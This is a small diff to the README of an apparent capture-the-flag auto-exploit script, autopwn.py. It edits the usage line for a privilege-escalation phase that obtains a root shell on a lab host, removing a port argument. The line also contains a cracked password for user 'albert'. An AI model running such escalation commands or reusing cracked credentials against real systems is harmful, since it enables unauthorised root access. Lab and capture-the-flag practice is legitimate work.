@@ -38,7 +38,7 @@ Arguments:
 
 Once you have cracked albert's password, use this phase to gain a root shell:
 ```bash
-python3 autopwn.py --type-attack privesc --ip 10.10.14.5 --port 4444 --ssh-pass manchesterunited
+python3 autopwn.py --type-attack privesc --ip 10.10.14.5 --ssh-pass manchesterunited
 ```
 Additional Arguments:
 - `--ssh-pass`	Password for albert (required for privesc)
